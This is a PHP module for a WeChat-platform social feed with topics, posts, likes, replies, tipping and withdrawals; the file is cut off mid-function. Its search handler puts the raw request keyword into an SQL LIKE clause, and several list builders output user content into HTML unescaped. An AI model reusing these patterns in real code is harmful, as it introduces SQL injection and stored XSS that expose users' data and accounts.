<?php

session_start();
defined('IN_IA') or die('Access Denied');
class Water_liveModuleSite extends WeModuleSite
{
    public $fanstable = 'water_live_fans';
    public $followtable = 'water_live_follow';
    public $topictable = 'water_live_topic';
    public $sectiontable = 'water_live_section';
    public $liketable = 'water_live_like';
    public $replytable = 'water_live_reply';
    public $ordertable = 'water_live_order';
    public $logtable = 'water_live_log';
    public $footertable = 'water_center_footer';
    public function doMobileIndex()
    {
        global $_GPC, $_W;
        $system     = $this->module['config'];
        $fans       = $this->checkinfo();
        $bannerimgs = unserialize($system['bannerimgs']);
        $sql        = "SELECT * FROM " . tablename($this->topictable) . "  WHERE state = 2 and uniacid = '{$_W['uniacid']}'  ORDER BY sindex";
        $list       = pdo_fetchall($sql);
        $count      = count($list);
        $row        = 0;
        if ($count <= 3) {
            $row = 1;
        } elseif ($count <= 9) {
            $row = 2;
        } else {
            $row = 3;
        }
        if ($system['isguide'] == 1) {
            $footersql  = "SELECT * FROM " . tablename($this->footertable) . " WHERE state = 2 and uniacid = {$_W['uniacid']} order by indexno";
            $footerlist = pdo_fetchall($footersql);
            $width      = intval(100 / count($footerlist));
            $host       = $this->module['config']['domain'];
            if (empty($host)) {
                $host = $_SERVER['HTTP_HOST'];
            }
            $baseUrl    = 'http://' . $host . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
            $footerhtml = '<link rel="stylesheet" href="../addons/water_center/template/css/footer.css">';
            $footerhtml .= '<style>
										.foot_nav li {
											float: left;
											width: ' . $width . '%;
											margin-top: 5px;
											text-align: center;
										}
									</style>';
            $footerhtml .= '<div class="foot_nav" id="footNav"><ul>';
            foreach ($footerlist as $index => $item) {
                if ($baseUrl == $item['url']) {
                    $footerhtml .= '<li class="foot_nav_item_' . $item['iclass'] . ' cur_foot_nav_item">';
                } else {
                    $footerhtml .= '<li class="foot_nav_item_' . $item['iclass'] . '">';
                }
                $footerhtml .= '<a href="' . $item['url'] . '">';
                $footerhtml .= '<i class="icon_global ' . $item['iconname'] . '"></i>';
                $footerhtml .= '<span class="word">' . $item['title'] . '</span>';
                $footerhtml .= '</a></li>';
            }
            $footerhtml .= '</ul></div>';
        }
        include $this->template('index');
    }
    public function doMobileSearch()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $fans   = $this->checkinfo();
        include $this->template('search');
    }
    public function doMobileAsySerach()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $keyword = $_GPC['keyword'];
        if (empty($keyword)) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'keyword is null'
            )));
        }
        $sql      = "";
        $sql      = "SELECT st.*,tp.shorttitle FROM " . tablename($this->sectiontable) . " as st 
											left join  " . tablename($this->topictable) . " as tp on st.topicid = tp.id
										 WHERE st.content like '%{$keyword}%' and st.state = 2 and st.uniacid = '{$_W['uniacid']}'  
											ORDER BY st.id desc limit 20";
        $lits     = pdo_fetchall($sql);
        $listhtml = '';
        foreach ($lits as $index => $row) {
            $title = $row['sharetitle'];
            if (empty($title)) {
                $title = mb_substr($row['content'], 0, 34, 'utf-8');
            }
            $listhtml .= '
								    <li><a href="' . $this->createMobileUrl('sdetail', array(
                'sectionid' => $row['id']
            )) . '"><h4 class="title">' . $title . '</h4>
			                        <p class="info"><span class="left">' . $row['shorttitle'] . ' 文/' . $row['nickname'] . '</span><span>' . $row['addtime'] . '</span></p></a>
			                        </li> ';
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success",
            "html" => $listhtml
        );
        die(json_encode($result));
    }
    public function doMobileAsyIndexTopic()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $topicid = intval($_GPC['topicid']);
        $sql     = "";
        if ($topicid == 0) {
            $sql = "SELECT s.* FROM " . tablename($this->sectiontable) . " as s 
											left join " . tablename($this->topictable) . " as t on s.topicid = t.id  
									WHERE s.state = 2 and s.uniacid = '{$_W['uniacid']}' and s.settop = 2 and t.state = 2  ORDER BY s.toptime desc limit 10";
        } elseif ($topicid == -1) {
            $sql = "SELECT s.* FROM " . tablename($this->sectiontable) . " as s 
											left join " . tablename($this->topictable) . " as t on s.topicid = t.id  
									WHERE s.state = 2 and s.uniacid = '{$_W['uniacid']}'  ORDER BY s.scansum desc limit 10";
        } elseif ($topicid == -2) {
            $sql = "SELECT s.* FROM " . tablename($this->sectiontable) . " as s 
											left join " . tablename($this->topictable) . " as t on s.topicid = t.id  
									WHERE s.state = 2 and s.uniacid = '{$_W['uniacid']}'  and t.state = 2  ORDER BY s.id desc limit 10";
        } elseif ($topicid == -3) {
            $sql = "SELECT st.* FROM " . tablename($this->sectiontable) . " as st
					                right join (
					                		SELECT ds.sectionid as sectionid ,ds.ct from (
														SELECT COUNT(*) as ct, sectionid FROM " . tablename($this->ordertable) . "  as o
																where o.type = 'reward' and o.state= 1
																   GROUP BY o.sectionid ORDER BY o.id ) as ds ORDER BY ds.ct desc ) as dsdata on dsdata.sectionid = st.id
								WHERE st.state = 2 and st.uniacid = '{$_W['uniacid']}'  ORDER BY dsdata.ct desc limit 10";
        } else {
            $sql = "SELECT * FROM " . tablename($this->sectiontable) . " as s 
											left join " . tablename($this->topictable) . " as t on s.topicid = t.id  
								WHERE s.state = 2 and s.uniacid = '{$_W['uniacid']}' and s.topicid = '{$topicid}'  ORDER BY s.settop desc limit 10";
        }
        $lits     = pdo_fetchall($sql);
        $listhtml = '';
        foreach ($lits as $index => $row) {
            $title = $row['sharetitle'];
            if (empty($title)) {
                $title = mb_substr($row['content'], 0, 34, 'utf-8');
                if (empty($title)) {
                    $title = '查看详情';//yi fu yuan ma wang
                }
            }
            $time = $this->format_date(strtotime($row['addtime']));
            $listhtml .= '<li>
				            <div class="shang-name">
				              <a href="" class="shang-head"> <em class="icon shang-head-photo"><img src="' . $row['headimgurl'] . '"></em>
				                <span class="shang-head-name">' . $row['nickname'] . '</span>
				              </a>
				              <span class="shang-num">' . $time . '</i>
				               
				              </span>
				            </div>
				            <h3 class="shang-title">
				              <a href="' . $this->createMobileUrl('sdetail', array(
                'sectionid' => $row['id']
            )) . '">' . $title . '</a>
				            </h3>
				          </li>';
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success",
            "html" => $listhtml
        );
        die(json_encode($result));
    }
    public function doMobileHome()
    {
        global $_GPC, $_W;
        $fans    = $this->checkinfo();
        $system  = $this->module['config'];
        $fansid  = intval($_GPC['fansid']);
        $thefans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id ='{$fansid}'");
        if (empty($thefans)) {
            message('Ta不见了，去哪了');
        }
        if ($system['isnewhome'] == 1) {
            $allreceive = round($this->getFansAllReceiveReward($thefans['id']), 2);
            $doreward   = round($this->getFansAllDoReward($thefans['id']), 2);
            $follow     = pdo_fetch("SELECT * FROM " . tablename($this->followtable) . " WHERE thefansid ='{$fansid}' and fansid='{$fans['id']}'");
            $sql        = "SELECT sec.*,t.shorttitle FROM " . tablename($this->sectiontable) . " as sec 
										left join " . tablename($this->topictable) . " as t on sec.topicid = t.id 
										WHERE sec.state = 2 and sec.uniacid = '{$_W['uniacid']}' and sec.fansid = '{$fansid}'  ORDER BY sec.settop desc,sec.toptime desc,sec.id desc limit 30";
            $addlist    = pdo_fetchall($sql);
            $topiclist  = array();
            foreach ($addlist as $index => $row) {
                $str = $row['showtitle'];
                if (empty($str)) {
                    $str = $row['sharetitle'];
                    if (empty($str)) {
                        $str = $row['content'];
                    }
                }
                $row['title']      = mb_substr($str, 0, 36, 'utf-8');
                $row['ym']         = date("Y.m", strtotime($row['addtime']));
                $row['r']          = date("d", strtotime($row['addtime']));
                $replyresult       = pdo_fetch("SELECT count(*) as cnt FROM " . tablename($this->replytable) . " WHERE state = 2 and uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}'");
                $row['replysum']   = $replyresult['cnt'] <= 0 ? 0 : $replyresult['cnt'];
                $topiclist[$index] = $row;
            }
            $reply2list = array();
            $replysql   = "SELECT r.*,t.shorttitle,sec.showtitle,sec.sharetitle,sec.content as scontent FROM " . tablename($this->replytable) . " as r
								                   left join " . tablename($this->sectiontable) . " as sec  on r.sectionid = sec.id
								                   left join " . tablename($this->topictable) . " as t on sec.topicid = t.id 
						 					WHERE r.state = 2 and r.uniacid = '{$_W['uniacid']}' and r.datafrom = '{$fansid}' ORDER BY r.id limit 50";
            $replylist  = pdo_fetchall($replysql);
            foreach ($replylist as $index => $row) {
                $str = $row['showtitle'];
                if (empty($str)) {
                    $str = $row['sharetitle'];
                    if (empty($str)) {
                        $str = htmlspecialchars($row['scontent']);
                    }
                }
                $row['title']       = mb_substr($str, 0, 36, 'utf-8');
                $reply2list[$index] = $row;
            }
            include $this->template('home2');
        } else {
            $thetime   = $this->format_date_reg(strtotime($thefans['addtime']));
            $sql       = "SELECT * FROM " . tablename($this->sectiontable) . "  
									WHERE state = 2 and uniacid = '{$_W['uniacid']}' and fansid = '{$fansid}'  ORDER BY settop desc,toptime desc,id desc limit 10";
            $list      = pdo_fetchall($sql);
            $topiclist = array();
            foreach ($list as $index => $row) {
                $row['showtime'] = $this->format_date(strtotime($row['addtime']));
                $likesql         = "SELECT headimgurl,fansid FROM " . tablename($this->liketable) . " WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
                $likelist        = pdo_fetchall($likesql);
                $row['likelist'] = $likelist;
                if (count($likelist) < 10) {
                    $row['likesum'] = count($likelist);
                } else {
                    $total          = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->liketable) . "
														WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id");
                    $row['likesum'] = $total;
                }
                $dolike = pdo_fetch("SELECT * FROM " . tablename($this->liketable) . " WHERE fansid = '{$fans['id']}' and  uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}'");
                if (empty($dolike)) {
                    $row['dolike'] = 0;
                } else {
                    $row['dolike'] = 1;
                }
                $rewardsum         = $this->getRewardCountBySid($row['id']);
                $replysql          = "SELECT datato,toname,datafrom,nickname,content FROM " . tablename($this->replytable) . " WHERE state = 2 and uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
                $replylist         = pdo_fetchall($replysql);
                $row['replylist']  = $replylist;
                $row['replysum']   = count($replylist);
                $topiclist[$index] = $row;
            }
            include $this->template('home');
        }
    }
    public function doMobileReward()
    {
        global $_GPC, $_W;
        $system     = $this->module['config'];
        $fans       = $this->checkinfo();
        $allreceive = round($this->getFansAllReceiveReward($fans['id']), 2);
        $receive    = round($allreceive * $system['fansper'] / 100, 2);
        $cash       = round($this->getFansHasGetReward($fans['id']), 2);
        $leftreward = round($receive - $cash, 2);
        $doreward   = round($this->getFansAllDoReward($fans['id']), 2);
        include $this->template('reward');
    }
    public function doMobileTixian()
    {
        global $_GPC, $_W;
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid'])) {
            $result = array(
                "status" => 0,
                "msg" => "openid is null"
            );
            return json_encode($result);
        } else {
            return $this->fanstransfer($fans);
        }
    }
    public function doMobileRewardItem()
    {
        global $_GPC, $_W;
        $fans      = $this->checkinfo();
        $type      = $_GPC['type'];
        $list      = array();
        $condition = "";
        $title     = "赏金明细";
        if ($type == 'receive') {
            $title     = "收到赏金明细";
            $condition = " and type = 'reward' and sfansid= '{$fans['id']}'";
        } elseif ($type == 'cash') {
            $title     = "提现明细";
            $condition = " and type = 'cash' and fansid= '{$fans['id']}'";
        } elseif ($type == 'doreward') {
            $title     = "打赏明细";
            $condition = " and type = 'reward' and fansid= '{$fans['id']}'";
        }
        $sql  = "SELECT * FROM " . tablename($this->ordertable) . " WHERE state = 1 and uniacid = '{$_W['uniacid']}' {$condition} ORDER BY id desc";
        $list = pdo_fetchall($sql);
        include $this->template('rewarditem');
    }
    public function dylog($msg, $openid)
    {
        $logdata = array(
            'msg' => $msg,
            'openid' => $openid
        );
        pdo_insert($this->logtable, $logdata);
    }
    public function doMobileTopicList()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $fans   = $this->checkinfo();
        $mfans  = pdo_fetch("SELECT follow FROM " . tablename('mc_mapping_fans') . " WHERE openid ='{$fans['openid']}' and uniacid = '{$_W['uniacid']}' ");
        load()->model('mc');
        $uid = $_W['member']['uid'];
        if ($system['issign'] == 1) {
            if ($uid == 0) {
                $jifen = "-1";
            } else {
                $result = mc_credit_fetch($uid);
                $jifen  = intval($result['credit1']);
                $a_date = date('Y-m-d', strtotime($fans['signtime']));
                $b_date = date('Y-m-d');
                if ($a_date == $b_date) {
                    $sign = 1;
                } else {
                    $sign = 0;
                }
            }
        }
        $sql        = "SELECT * FROM " . tablename($this->topictable) . "  WHERE state = 2 and uniacid = '{$_W['uniacid']}'  ORDER BY sindex";
        $list       = pdo_fetchall($sql);
        $allreceive = round($this->getFansAllReceiveReward($fans['id']), 2);
        if ($system['isguide'] == 1) {
            $footersql  = "SELECT * FROM " . tablename($this->footertable) . " WHERE state = 2 and uniacid = {$_W['uniacid']} order by indexno";
            $footerlist = pdo_fetchall($footersql);
            $width      = intval(100 / count($footerlist));
            $host       = $this->module['config']['domain'];
            if (empty($host)) {
                $host = $_SERVER['HTTP_HOST'];
            }
            $baseUrl    = 'http://' . $host . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
            $footerhtml = '<link rel="stylesheet" href="../addons/water_center/template/css/footer.css">';
            $footerhtml .= '<style>
										.foot_nav li {
											float: left;
											width: ' . $width . '%;
											margin-top: 5px;
											text-align: center;
										}
									</style>';
            $footerhtml .= '<div class="foot_nav" id="footNav"><ul>';
            foreach ($footerlist as $index => $item) {
                if ($baseUrl == $item['url']) {
                    $footerhtml .= '<li class="foot_nav_item_' . $item['iclass'] . ' cur_foot_nav_item">';
                } else {
                    $footerhtml .= '<li class="foot_nav_item_' . $item['iclass'] . '">';
                }
                $footerhtml .= '<a href="' . $item['url'] . '">';
                $footerhtml .= '<i class="icon_global ' . $item['iconname'] . '"></i>';
                $footerhtml .= '<span class="word">' . $item['title'] . '</span>';
                $footerhtml .= '</a></li>';
            }
            $footerhtml .= '</ul></div>';
        }
        include $this->template('topiclist');
    }
    public function doMobileDoSign()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $a_date = date('Y-m-d', strtotime($fans['signtime']));
        $b_date = date('Y-m-d');
        if ($a_date != $b_date) {
            load()->model('mc');
            $system = $this->module['config'];
            $uid    = $_W['member']['uid'];
            if ($uid > 0 && intval($system['syssign']) > 0) {
                $jifenresult = mc_credit_update($uid, 'credit1', $system['syssign'], array(
                    $uid,
                    $system['sysname'] . '签到'
                ));
                pdo_update($this->fanstable, array(
                    'signtime' => date("Y-m-d H:i:s")
                ), array(
                    'id' => $fans['id']
                ));
            }
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success"
        );
        die(json_encode($result));
    }
    public function doMobileDoShare()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $result = array();
        if ($system['sysshare'] > 0) {
            $openid = $this->checkopenid();
            $fans   = $this->getFansDBInfo($openid);
            if (empty($fans['openid']) || empty($fans['nickname'])) {
                die(json_encode(array(
                    "errcode" => 1,
                    "errmsg" => 'un auth'
                )));
            }
            $a_date = date('Y-m-d', strtotime($fans['sharetime']));
            $b_date = date('Y-m-d');
            if ($a_date != $b_date) {
                load()->model('mc');
                $system = $this->module['config'];
                $uid    = $_W['member']['uid'];
                if ($uid > 0 && intval($system['sysshare']) > 0) {
                    $jifenresult = mc_credit_update($uid, 'credit1', $system['sysshare'], array(
                        $uid,
                        $system['sysname'] . '分享'
                    ));
                    pdo_update($this->fanstable, array(
                        'sharetime' => date("Y-m-d H:i:s")
                    ), array(
                        'id' => $fans['id']
                    ));
                }
                $result = array(
                    "errcode" => 0,
                    "errmsg" => "success",
                    "errmsg" => "积分+" . $system['sysshare']
                );
            } else {
                $result = array(
                    "errcode" => 0,
                    "errmsg" => "success",
                    "errmsg" => "今天已分享"
                );
            }
        } else {
            $result = array(
                "errcode" => 1,
                "errmsg" => "un open sysshare"
            );
        }
        die(json_encode($result));
    }
    public function doMobileTopic()
    {
        global $_GPC, $_W;
        $fans    = $this->checkinfo();
        $system  = $this->module['config'];
        $topicid = intval($_GPC['topicid']);
        if ($topicid == 0) {
            message('topicid is null');
        }
        $topic     = pdo_fetch("SELECT * FROM " . tablename($this->topictable) . " WHERE id ='{$topicid}'");
        $sql       = "SELECT * FROM " . tablename($this->sectiontable) . "  
							WHERE state = 2 and uniacid = '{$_W['uniacid']}' and topicid = '{$topic['id']}'  ORDER BY settop desc,toptime desc,id desc limit 10";
        $list      = pdo_fetchall($sql);
        $topiclist = array();
        foreach ($list as $index => $row) {
            $row['showtitle'] = str_replace('#', '<br>', $row['showtitle']);
            $row['showtime']  = $this->format_date(strtotime($row['addtime']));
            $likesql          = "SELECT headimgurl,fansid FROM " . tablename($this->liketable) . " 
										WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
            $likelist         = pdo_fetchall($likesql);
            $row['likelist']  = $likelist;
            if (count($likelist) < 10) {
                $row['likesum'] = count($likelist);
            } else {
                $total          = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->liketable) . "
											WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id");
                $row['likesum'] = $total;
            }
            $dolike = pdo_fetch("SELECT * FROM " . tablename($this->liketable) . " WHERE fansid = '{$fans['id']}' and  uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}'");
            if (empty($dolike)) {
                $row['dolike'] = 0;
            } else {
                $row['dolike'] = 1;
            }
            $rewardsum = $this->getRewardCountBySid($row['id']);
            if ($rewardsum > 0) {
                $row['rewardsum'] = '赏' . $rewardsum;
            } else {
                $row['rewardsum'] = '打赏';
            }
            $replysql          = "SELECT datato,toname,datafrom,nickname,content FROM " . tablename($this->replytable) . " WHERE state = 2 and uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
            $replylist         = pdo_fetchall($replysql);
            $row['replylist']  = $replylist;
            $row['replysum']   = count($replylist);
            $topiclist[$index] = $row;
        }
        include $this->template('topic');
    }
    public function doMobileAsySection()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $topicid = intval($_GPC['topicid']);
        $fansid  = intval($_GPC['fansid']);
        if ($topicid == 0 && $fansid == 0) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'topicid or fansid is null'
            )));
        }
        $pageNumber = intval($_GPC['page']) + 1;
        $pageSize   = 10;
        $total      = 0;
        $selectsql  = "";
        if ($topicid > 0) {
            $topic     = pdo_fetch("SELECT * FROM " . tablename($this->topictable) . " WHERE id ='{$topicid}'");
            $total     = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->sectiontable) . " 
											WHERE state = 2 and uniacid = '{$_W['uniacid']}' and topicid = '{$topicid}'  ORDER BY id desc");
            $selectsql = "SELECT * FROM " . tablename($this->sectiontable) . "
											WHERE state = 2 and uniacid = '{$_W['uniacid']}'
													and topicid = '{$topic['id']}'  ORDER BY id desc
														LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        } else {
            $total     = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->sectiontable) . "
													WHERE state = 2 and uniacid = '{$_W['uniacid']}' and fansid = '{$fansid}'  ORDER BY id desc");
            $selectsql = "SELECT * FROM " . tablename($this->sectiontable) . "
											WHERE state = 2 and uniacid = '{$_W['uniacid']}'
													and fansid = '{$fansid}'  ORDER BY id desc
														LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        }
        $maxpage = ceil(floatval($total / $pageSize));
        if ($pageNumber <= $maxpage) {
            $list        = pdo_fetchall($selectsql);
            $sectionlist = array();
            foreach ($list as $index => $row) {
                $row['showtitle'] = str_replace('#', '<br>', $row['showtitle']);
                $row['showtime']  = $this->format_date(strtotime($row['addtime']));
                $likesql          = "SELECT headimgurl,fansid FROM " . tablename($this->liketable) . " 
													WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
                $likelist         = pdo_fetchall($likesql);
                $row['likelist']  = $likelist;
                if (count($likelist) < 10) {
                    $row['likesum'] = count($likelist);
                } else {
                    $total          = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->liketable) . "
													WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id");
                    $row['likesum'] = $total;
                }
                $dolike = pdo_fetch("SELECT * FROM " . tablename($this->liketable) . " WHERE fansid = '{$fans['id']}' and  uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}'");
                if (empty($dolike)) {
                    $row['dolike'] = 0;
                } else {
                    $row['dolike'] = 1;
                }
                $rewardsum = $this->getRewardCountBySid($row['id']);
                if ($rewardsum > 0) {
                    $row['rewardsum'] = '赏' . $rewardsum;
                } else {
                    $row['rewardsum'] = '打赏';
                }
                $replysql            = "SELECT datato,toname,datafrom,nickname,content FROM " . tablename($this->replytable) . " WHERE state = 2 and uniacid = '{$_W['uniacid']}' and sectionid = '{$row['id']}' ORDER BY id limit 10";
                $replylist           = pdo_fetchall($replysql);
                $row['replylist']    = $replylist;
                $row['replysum']     = count($replylist);
                $sectionlist[$index] = $row;
            }
            $listhtml = '';
            $listhtml .= ' <div id="datapage101_' . $pageNumber . '" class="list_page" data-pageno="' . $pageNumber . '">';
            foreach ($sectionlist as $index => $row) {
                $listhtml .= '<div class="post_item" data-sectionid="' . $row['id'] . '" data-topicid="' . $row['topicid'] . '" data-topic="' . $topic['stitle'] . '">';
                $status = '';
                if ($row['status'] == 2) {
                    $status = 'item_admin';
                }
                $scanstr = '';
                if ($system['isscan'] == 1) {
                    $scanstr = ' 浏览' . $row['scansum'];
                }
                $listhtml .= '<div class="item_top clearfix">
				                    			<a class="head" href="' . $this->createMobileUrl('home', array(
                    'fansid' => $row['fansid']
                )) . '" title="" target=""><img class="head_img img_loading" data-img="' . $row['headimgurl'] . '" src="../addons/water_live/template/img/head.png" alt=""></a>
				                    			<a class="item_name" href=""><p class="">' . $row['nickname'] . '</p><p class="time">' . $row['showtime'] . $scanstr . '</p></a>
				                  			</div>';
                $listhtml .= '<a class="href_bar" href="' . $this->createMobileUrl('sdetail', array(
                    'sectionid' => $row['id']
                )) . '" title="" target="">';
                $showstr = $row['showtitle'];
                if (empty($showstr)) {
                    $showstr = $row['content'];
                }
                $listhtml .= '<div class="item_content">' . $showstr . '</div>';
                if (!empty($row['audiosid'])) {
                    $listhtml .= '<div class="item_content">
													<div class="post-voice-box-rp rel">
											            <div class="post-voice-box-pause" id="voicelable" >
																<span style="padding-left:40px;line-height:20px;font-size: 80%;" id="voiceshow">' . $row['audiotime'] . '</span></div>
											        </div>
											        <input type="hidden" id="voicestate" value="0">
											        <input type="hidden" id="audiosid" value="' . $row['audiosid'] . '">
												</div>
												 <div style="clear:both;"></div>';
                }
                $simgs = unserialize($row['imgs']);
                if (!empty($simgs)) {
                    if (count($simgs) == 1) {
                        $listhtml .= '
													<div class="img_bar clearfix  img_size_1">
								                    	<img class="item_img img_single img_loading" data-img="' . $_W['attachurl'] . $simgs[0] . '" alt="" src="../addons/water_live/template/img/abiu_loading.gif" style="opacity: 1; width: 176px; height: auto;">
								                    </div>';
                    } else {
                        $listhtml .= '<div class="img_bar clearfix">';
                        foreach ($simgs as $sindex => $img) {
                            $listhtml .= '
														  <div class="img_size_little">
									                        <img class="item_img img_multi img_loading" data-img="' . $_W['attachurl'] . $img . '" src="../addons/water_live/template/img/abiu_loading.gif" style="width:100%;height: auto; opacity: 1;">
									                      </div>';
                        }
                        $listhtml .= '</div>';
                    }
                }
                $listhtml .= '</a>';
                $listhtml .= '<div class="item_content" 
										style="line-height: 16px; color: #5a85ce; font-size:11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">' . $row['address'] . '</div>';
                $listhtml .= '<div class="show_bar clearfix">
				                    		   <div class="show_btn">';
                if ($system['isreward'] == 1) {
                    $listhtml .= '<div class="able_btn comment_btn3">
															<i class="icon_comment3 icon_source"></i>
															<span class="num">' . $row['rewardsum'] . '</span>
														 </div> 
						                      			 <div class="able_btn comment_btn">
						                        			<i class="icon_comment icon_source"></i>
						                        			<span class="num">评论</span>
						                      			 </div>';
                } else {
                    $listhtml .= '<div class="able_btn comment_btn">
						                        			<i class="icon_comment icon_source"></i>
						                        			<span class="num">评论</span>
						                      			 </div>';
                }
                if ($row['dolike'] == 1) {
                    $listhtml .= '<div class="able_btn like_btn like_active">';
                } else {
                    $listhtml .= '<div class="able_btn like_btn">';
                }
                $listhtml .= '<i class="icon_like icon_source"></i>';
                if ($row['likesum'] == 0) {
                    $listhtml .= '<span class="num">赞</span>';
                } else {
                    $listhtml .= '<span class="num">' . $row['likesum'] . '</span>';
                }
                $listhtml .= '</div></div></div>';
                if ($row['likesum'] == 0 && $row['replysum'] == 0) {
                    $listhtml .= '<div class="comment_bar" data-commit="0" data-like="' . $row['likesum'] . '" data-comment="' . $row['replysum'] . '" style="display:none;">';
                } else {
                    $listhtml .= '<div class="comment_bar" data-commit="0" data-like="' . $row['likesum'] . '" data-comment="' . $row['replysum'] . '" style="display:block;">';
                }
                $listhtml .= '<i class="top_arrow"></i><i class="top_line"></i>';
                if ($row['likesum'] == 0) {
                    $listhtml .= '<div class="like_bar clearfix" style="display:none;">';
                } else {
                    $listhtml .= '<div class="like_bar clearfix" style="display:block;">';
                }
                $listhtml .= '<i class="icon_source icon_like_little"></i>';
                if ($row['likesum'] > 0) {
                    foreach ($row['likelist'] as $lindex => $like) {
                        if ($lindex < 7) {
                            $listhtml .= '<div class="like_item">
							                        					<a class="head" href="' . $this->createMobileUrl('home', array(
                                'fansid' => $like['fansid']
                            )) . '" title="" target=""><img class="head_img img_loading" data-img="' . $like['headimgurl'] . '" src="../addons/water_live/template/img/head.png"></a>
							                      					</div>';
                        }
                    }
                    if ($row['likesum'] > 8) {
                        $listhtml .= '<div class="like_item" style="display:block;">';
                    } else {
                        $listhtml .= '<div class="like_item" style="display:none;">';
                    }
                    $listhtml .= '<a class="head" href="" ><img class="head_img" src="../addons/water_live/template/img/more_like_list.png" alt=""></a>
					                        </div>';
                }
                $listhtml .= '</div>';
                if ($row['replysum'] == 0) {
                    $listhtml .= '<div class="comment_box" data-count="' . $row['replysum'] . '" style="display:none;">';
                } else {
                    $listhtml .= '<div class="comment_box" data-count="' . $row['replysum'] . '" style="display:block;">';
                    foreach ($row['replylist'] as $rindex => $reply) {
                        if ($rindex < 6) {
                            $listhtml .= '<p class="comment_item" data-to="' . $reply['datato'] . '" data-from="' . $reply['datafrom'] . '" data-user="' . $reply['nickname'] . '">';
                            if ($reply['datato'] == 0) {
                                $listhtml .= '<a class="name" href="' . $this->createMobileUrl('home', array(
                                    'fansid' => $reply['datafrom']
                                )) . '">' . $reply['nickname'] . '：</a>';
                            } else {
                                $listhtml .= '<a class="name" href="' . $this->createMobileUrl('home', array(
                                    'fansid' => $reply['datafrom']
                                )) . '">' . $reply['nickname'] . '</a>回复<a class="name" href="">' . $reply['toname'] . '：</a>';
                            }
                            $listhtml .= '<span class="comment_content">' . $reply['content'] . '</span></p>';
                        }
                    }
                }
                if ($row['replysum'] > 5) {
                    $listhtml .= '<p class="comment_item more_comment" style="display:block;">';
                } else {
                    $listhtml .= '<p class="comment_item more_comment" style="display:none;">';
                }
                $listhtml .= '<a class="name" href="' . $this->createMobileUrl('sdetail', array(
                    'sectionid' => $row['id']
                )) . '">更多…</a>
				                      </p>
				                    </div>
				                    <div class="comment_edit">
				                      <textarea class="edit_text" name="" id="" placeholder="0" data-to=""></textarea>
				                      <div class="left_num">200</div>
				                      <div class="btn_bar clearfix">
				                        <div class="commit btn">发送</div>
				                        <div class="cancel btn">取消</div>
				                      </div>
				                    </div>
				                  </div>
				                </div>';
            }
            $listhtml .= '</div>';
            $result = array(
                "errcode" => 0,
                "pageno" => $pageNumber,
                "errmsg" => "huhu",
                "data" => $listhtml
            );
            die(json_encode($result));
        } else {
            $result = array(
                "errcode" => 1,
                "errmsg" => "没有更多啦"
            );
            die(json_encode($result));
        }
    }
    public function getFansTest()
    {
        global $_W;
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id ='5319'");
        return $fans;
    }
    public function doMobileSdetail()
    {
        global $_GPC, $_W;
        $system    = $this->module['config'];
        $fans      = $this->checkinfo();
        $sectionid = intval($_GPC['sectionid']);
        if ($sectionid == 0) {
            message('sectionid is null');
        }
        pdo_query("UPDATE " . tablename($this->sectiontable) . " SET scansum = scansum +1 WHERE id ='{$sectionid}' ");
